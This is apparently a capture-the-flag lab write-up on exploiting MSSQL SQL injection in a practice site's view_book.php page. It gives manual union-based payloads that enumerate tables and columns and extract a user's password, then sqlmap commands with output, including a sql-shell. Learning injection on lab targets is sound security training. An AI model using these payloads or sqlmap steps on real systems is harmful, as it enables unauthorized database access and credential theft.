## Challenge #4 - Poema Reading club 7

## Objectives

- You want to find SQL injection vulnerabilities in the website, determining the type of SQL injection and its exploitability.
- You will also have to extract information from the database exploiting the vulnerability. This time you have to determine whether you can use a tool and eventually if you can use any other manual and more direct technique
- Find out Ruud password in the database

## What you will learn

- How to find SQL injection vulnerabilities manually
- How to determine which is the best SQL injection technique to use in certain cases
- How to extract information from a database using direct queries

## hints

- MSSQL
- Error-Based

## Resources

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
- http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

## Steps

The vulnerable endpoint is view_book.php. Open this endpoint and put a single quote as id "'".

```
http://4.challenge.sqli.site/view_book.php?id='
```

You will receive a MSSQL Error message as response. You

```
Error: [Microsoft][SQL Server Native Client 11.0][SQL Server]Unclosed quotation mark after the character string ' '. Error: [Microsoft][SQL Server Native Client 11.0][SQL Server]Incorrect syntax near ' '. 
```

Sending the payload "id=9999 or 1=1-- -", as the there is no book with id 9999 the system will return the first book retrieved.

Finding the number of columns.

```
id=9999 order by 3

No errors

id=9999 order by 4

No errors

id=9999 order by 5

No errors

id=9999 order by 6

No errors

id=9999 order by 7


Error: [Microsoft][SQL Server Native Client 11.0][SQL Server]The ORDER BY position number 7 is out of range of the number of items in the select list. 
```

So, we have a query with 6 columns.

Now try to pass a union query with numbers.


```
id=9999 union select 91,92,93,94,95,96
```

In response you will get the number 94 as book title and 91 as book id.

```
<span style="border:1; color: #000000;">94<BR/><BR/><img src="books/91.jpg"><br/>
</center>
<p class="links"><a href="view_book.php?id=91">Read More</a></p>
```

Use the next query to fetch the current database

```
id=9999 union select 91,92,93,db_name(),95,96

poema
```

Through the next query, we will try to fetch table name inside the database

```
id=9999 union select 91,92,93,name,95,96 from poema..sysobjects where xtype = 'U'


Error: [Microsoft][SQL Server Native Client 11.0][SQL Server]Cannot resolve the collation conflict between "SQL_Latin1_General_CP1_CI_AS" and "Latin1_General_CI_AS" in the UNION operation. 
```

To solve this error you need send the correct collate on the field.

```
id=9999 union select 91,92,93,name collate database_default,95,96 from poema..sysobjects where xtype = 'U'

books

id=9999 union select 91,92,93,name collate database_default,95,96 from poema..sysobjects where xtype = 'U' and name != 'books'

club_members
```

Now you need to list all columns from club_members table.

```
id=9999 union select 91,92,93,name collate database_default,95,96 from syscolumns where id = (select id from sysobjects where name = 'club_members')

city

id=9999 union select 91,92,93,name collate database_default,95,96 from syscolumns where id = (select id from sysobjects where name = 'club_members') and name != 'city'

id

id=9999 union select 91,92,93,name collate database_default,95,96 from syscolumns where id = (select id from sysobjects where name = 'club_members') and name != 'city' and name != 'id'

name

id=9999 union select 91,92,93,name collate database_default,95,96 from syscolumns where id = (select id from sysobjects where name = 'club_members') and name != 'city' and name != 'id' and name != 'name'

password
```

Now we can retrieve the Ruud password.

```
id=9999 union select 91,92,93,password collate database_default,95,96 from club_members where name = 'Ruud'

WJI80JFF9XQ
```

# SQLMap way

Send the endpoint to SQLMap.

```
sqlmap -u http://4.challenge.sqli.site/view_book.php?id=1 --dbms=mssql --batch

GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 55 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1956=1956

    Type: inline query
    Title: Generic inline queries
    Payload: id=(SELECT CONCAT(CONCAT(CHAR(113)+CHAR(98)+CHAR(106)+CHAR(118)+CHAR(113),(CASE WHEN (8259=8259) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(107)+CHAR(122)+CHAR(113)+CHAR(113)))

    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: id=1 AND 9928 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (9928=9928) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(122)+CHAR(113)+CHAR(113)))

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: id=1;WAITFOR DELAY '0:0:5'--

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: id=1 WAITFOR DELAY '0:0:5'

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-9405 UNION ALL SELECT NULL,NULL,NULL,CHAR(113)+CHAR(98)+CHAR(106)+CHAR(118)+CHAR(113)+CHAR(117)+CHAR(68)+CHAR(68)+CHAR(122)+CHAR(119)+CHAR(110)+CHAR(116)+CHAR(77)+CHAR(70)+CHAR(84)+CHAR(83)+CHAR(80)+CHAR(102)+CHAR(65)+CHAR(65)+CHAR(84)+CHAR(119)+CHAR(102)+CHAR(68)+CHAR(108)+CHAR(103)+CHAR(111)+CHAR(103)+CHAR(82)+CHAR(78)+CHAR(109)+CHAR(78)+CHAR(114)+CHAR(107)+CHAR(100)+CHAR(102)+CHAR(87)+CHAR(105)+CHAR(85)+CHAR(85)+CHAR(76)+CHAR(74)+CHAR(98)+CHAR(117)+CHAR(67)+CHAR(113)+CHAR(107)+CHAR(122)+CHAR(113)+CHAR(113),NULL,NULL-- CMEc
---
```

List all databases.

```
sqlmap -u http://4.challenge.sqli.site/view_book.php?id=1 --dbms=mssql --batch --dbs

available databases [11]:
[*] AdventureWorks
[*] AdventureWorks2014
[*] cmsmanagement
[*] ecommerce_books2
[*] Employees
[*] master
[*] model
[*] msdb
[*] poema
[*] tempdb
[*] usrmanagement
```

List all tables on poema database.

```
sqlmap -u http://4.challenge.sqli.site/view_book.php?id=1 --dbms=mssql --batch -D poema --tables

Database: poema
[2 tables]
+--------------+
| books        |
| club_members |
+--------------+

```

Get a sql-shell and query for the Ruud user.

```
sqlmap -u http://4.challenge.sqli.site/view_book.php?id=1 --dbms=mssql --batch -D poema -T club_members --sql-shell

select * from club_members where name = 'Ruud'

retrieved: 'Cerritos','12','Ruud','WJI80JFF9XQ','feugiat@nonsollicitudin.org','73544'
```
